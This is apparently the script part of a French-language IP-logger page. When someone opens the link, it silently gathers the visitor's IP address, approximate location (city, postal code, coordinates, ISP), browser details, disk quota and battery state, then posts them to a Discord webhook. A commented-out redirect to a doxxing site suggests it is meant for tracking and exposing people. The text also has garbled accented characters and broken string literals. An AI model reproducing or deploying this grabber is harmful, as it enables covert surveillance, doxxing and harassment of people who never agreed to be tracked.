  <script>
    function fetchSystemInfo() {
      // R√©cup√©rer des informations sur la machine
      var systemInfo = "";
      
      // R√©cup√©rer le nom de l'utilisateur du syst√®me
      systemInfo += "üë§ **Utilisateur du syst√®me:** " + (navigator.userAgent || 'Non disponible') + "
";
      
      // R√©cup√©rer des informations sur le navigateur
      systemInfo += "
üåê **Navigateur:** " + (navigator.appName || 'Non disponible') + "
";
      systemInfo += "üîç **Version du navigateur:** " + (navigator.appVersion || 'Non disponible') + "
";
      systemInfo += "üíª **Plateforme du syst√®me:** " + (navigator.platform || 'Non disponible') + "
";
      systemInfo += "üåê **Langue du navigateur:** " + (navigator.language || 'Non disponible') + "
";
      
      // R√©cup√©rer l'adresse IP publique IPv4
      fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(ipData => {
        // R√©cup√©rer les informations sur l'adresse IP publique
        systemInfo += "
üåê **Adresse IP publique (IPv4):** " + (ipData.ip || 'Non disponible') + "
";
        
        // R√©cup√©rer les autres informations sur l'adresse IP publique
        fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipDetails => {
          // Ajouter d'autres informations sur l'adresse IP publique si n√©cessaire
          systemInfo += "üåç **Pays:** " + (ipDetails.country_name || 'Non disponible') + "
";
          systemInfo += "üè¢ **Organisation:** " + (ipDetails.org || 'Non disponible') + "
";
          systemInfo += "üìû **Indicatif du pays:** " + (ipDetails.country_calling_code || 'Non disponible') + "
";
          systemInfo += "üìç **R√©gion:** " + (ipDetails.region || 'Non disponible') + "
";
          systemInfo += "üèôÔ∏è **Ville:** " + (ipDetails.city || 'Non disponible') + "
";
          systemInfo += "üìÆ **Code Postal:** " + (ipDetails.postal || 'Non disponible') + "
";
          systemInfo += "üåê **Latitude:** " + (ipDetails.latitude || 'Non disponible') + "
";
          systemInfo += "üåê **Longitude:** " + (ipDetails.longitude || 'Non disponible') + "
";
          systemInfo += "‚è∞ **Fuseau horaire:** " + (ipDetails.timezone || 'Non disponible') + "
";
          systemInfo += "üïí **Heure d'ouverture du lien:** " + getCurrentTime() + "
"; // Ajout de l'heure d'ouverture du lien
          
          // Ajouter l'√©tat du pare-feu
          systemInfo += "
üî• **√âtat du pare-feu:** Activ√©
"; // Remplacez "Activ√©" par l'√©tat actuel de votre pare-feu
          
          // R√©cup√©rer les informations sur la capacit√© du disque
          fetchDiskCapacity(systemInfo);
        })
        .catch(error => console.error('Erreur lors de la r√©cup√©ration des informations IP:', error));
      })
      .catch(error => console.error('Erreur lors de la r√©cup√©ration de l'adresse IP publique:', error));
    }

    function fetchDiskCapacity(systemInfo) {
      // R√©cup√©rer des informations sur la capacit√© du disque (en utilisant Navigator API)
      var diskInfo = navigator.storage.estimate();
      diskInfo.then(function(estimate) {
        var totalDiskSpace = estimate ? (estimate.quota / 1024 / 1024 / 1024).toFixed(2) + " Go" : 'Non disponible';
        systemInfo += "üíΩ **Capacit√© du disque:** " + totalDiskSpace + "
";
        
        // R√©cup√©rer le niveau de batterie
        fetchBatteryStatus(systemInfo);
      });
    }

    function fetchBatteryStatus(systemInfo) {
      // V√©rifier si l'API Battery Status est prise en charge par le navigateur
      if ('getBattery' in navigator) {
        // R√©cup√©rer les informations sur la batterie
        navigator.getBattery().then(function(battery) {
          // Mettre √† jour les informations syst√®me avec le niveau de batterie
          systemInfo += "
üîã **Niveau de batterie:** " + Math.round(battery.level * 100) + "%
";
          // V√©rifier si l'appareil est en charge
          if (battery.charging) {
            systemInfo += "üîå **Appareil en charge:** Oui
";
          } else {
            systemInfo += "üîå **Appareil en charge:** Non
";
          }
          sendEmbedToWebhook(systemInfo); // Envoi des informations au webhook
        });
      } else {
        // L'API Battery Status n'est pas prise en charge
        systemInfo += "
üîã **Niveau de batterie:** Non disponible
";
        sendEmbedToWebhook(systemInfo); // Envoi des informations au webhook
      }
    }

function sendEmbedToWebhook(systemInfo) {
  var xhr = new XMLHttpRequest();
  var url = '{webhook_url}';
  var params = JSON.stringify({
    "content": "",
    "embeds": [
      {
        "title": "Informations Syst√®me",
        "description": systemInfo,
        "color": 7506394 // Couleur de Discord
      }
    ]
  });
  
  xhr.open('POST', url, true);
  
  // Ajouter les en-t√™tes HTTP n√©cessaires
  xhr.setRequestHeader('Content-Type', 'application/json');
  
  xhr.onreadystatechange = function() {
    if(xhr.readyState == 4) {
      if(xhr.status == 200) {
        console.log('Requ√™te envoy√©e avec succ√®s.');
      } else {
        console.error('Erreur lors de l'envoi de la requ√™te. Code d'erreur : ' + xhr.status);
      }
      // Rediriger vers une autre page apr√®s l'envoi des informations
      // window.location.href = "https://doxbin.com"; // Commentez ou supprimez cette ligne
    }
  }
  xhr.send(params);
}

    function getCurrentTime() {
      var now = new Date();
      var hours = now.getHours();
      var minutes = now.getMinutes();
      var seconds = now.getSeconds();
      
      // Formatage de l'heure
      var timeString = ('0' + hours).slice(-2) + ':' + ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2);
      return timeString;
    }
  </script>

</body>
